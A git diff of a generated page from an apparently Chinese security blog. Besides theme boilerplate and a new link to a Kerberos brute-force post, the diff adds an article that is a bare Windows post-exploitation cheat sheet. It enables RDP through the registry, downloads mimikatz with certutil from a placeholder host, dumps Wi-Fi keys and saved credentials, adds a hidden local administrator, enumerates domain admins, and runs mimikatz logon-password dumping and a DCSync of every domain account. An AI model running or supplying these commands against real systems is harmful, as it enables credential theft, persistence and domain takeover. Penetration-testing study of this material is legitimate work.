@@ -7,13 +7,13 @@
   <meta name="description" content="Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Pentest">
-<meta property="og:url" content="http://sherlocz.github.io/Pentest/index.html">
+<meta property="og:title" content="Audit">
+<meta property="og:url" content="http://sherlocz.github.io/Audit/index.html">
 <meta property="og:site_name" content="Sriracha :)">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-01-08T09:09:40.000Z">
+<meta property="og:updated_time" content="2019-01-08T08:51:32.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Pentest">
+<meta name="twitter:title" content="Audit">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -90,7 +90,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(92)</small></div></li>
+    <li><div class="all active">全部文章<small>(93)</small></div></li>
     
 </ul>
 <div class="left-bottom">
@@ -102,7 +102,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="92">
+<input type="hidden" id="yelog_site_posts_number" value="93">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -157,11 +157,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">反汇编</a>
+        <a class="color5">内网渗透</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">内网渗透</a>
+        <a class="color4">反汇编</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -177,11 +177,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">主机漏洞</a>
+        <a class="color3">注入</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">注入</a>
+        <a class="color5">主机漏洞</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -189,11 +189,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">代码审计</a>
+        <a class="color5">甲方安全</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">甲方安全</a>
+        <a class="color5">代码审计</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -213,11 +213,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">批量</a>
+        <a class="color2">Sqlmap</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">Sqlmap</a>
+        <a class="color3">批量</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -229,19 +229,19 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">disable_function</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">msf</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">逆向</a>
+        <a class="color2">disable_function</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color3">思考</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">逆向</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -261,6 +261,14 @@
 
     
     <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2020/10/26/kerberos-brute/"
+           data-tag="内网渗透"
+           data-author="" >
+            <span class="post-title" title="基于kerberos协议的域内用户名密码爆破">基于kerberos协议的域内用户名密码爆破</span>
+            <span class="post-date" title="2020-10-26 14:41:54">2020/10/26</span>
+        </a>
         
         <a  class=""
            href="/2020/10/10/Obfuscate-Mimikatz/"
@@ -1026,8 +1034,31 @@
     }
 </style>
 </div>
-            <p>&lt;?</br><br>123</br><br>?&gt;</p>
-
+            <p>开启3389</p>
+<pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre><p>查看远程桌面端口：</p>
+<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
+</code></pre><p>远程下载：</p>
+<pre><code>certutil.exe -urlcache -split -f http://xxxxx/mimikatz.exe
+</code></pre><p>读取wifi密码：</p>
+<pre><code>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+</code></pre><p>远程桌面保存凭据：</p>
+<pre><code>cmdkey /list
+</code></pre><p>添加用户：</p>
+<pre><code>net user name password /add
+net localgroup administrators name /add
+net user name /delete
+</code></pre><p>域内信息收集：</p>
+<pre><code>net user /domain //获取域用户列表
+net group /domain  //查询域内所有用户组列表
+net group “Domain Admins” /domain //查询域管理员用户
+net group &quot;Domain Controllers&quot; /domain  //查看域控制器
+net localgroup administrators /domain  //查询域内置本地管理员组用户
+</code></pre><p>mimikatz:</p>
+<pre><code>privilege::debug
+sekurlsa::logonpassword(s)
+lsadump::dcsync /domain:test.com /all /csv
+</code></pre>
         </article>
         
         
@@ -1060,7 +1091,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#爬虫','#漏洞复现','#JAVA','#反汇编','#内网渗透','#汇编','#实战','#提权','#主机漏洞','#注入','#免杀','#代码审计','#甲方安全','#权限维持','#Python','#工具','#bypass','#批量','#Sqlmap','#汇总','#后渗透','#disable_function','#msf','#逆向','#思考','#应急响应','#译文','#钓鱼',],
+            'data': ['#爬虫','#漏洞复现','#JAVA','#内网渗透','#反汇编','#汇编','#实战','#提权','#注入','#主机漏洞','#免杀','#甲方安全','#代码审计','#权限维持','#Python','#工具','#bypass','#Sqlmap','#批量','#汇总','#后渗透','#msf','#disable_function','#思考','#逆向','#应急响应','#译文','#钓鱼',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
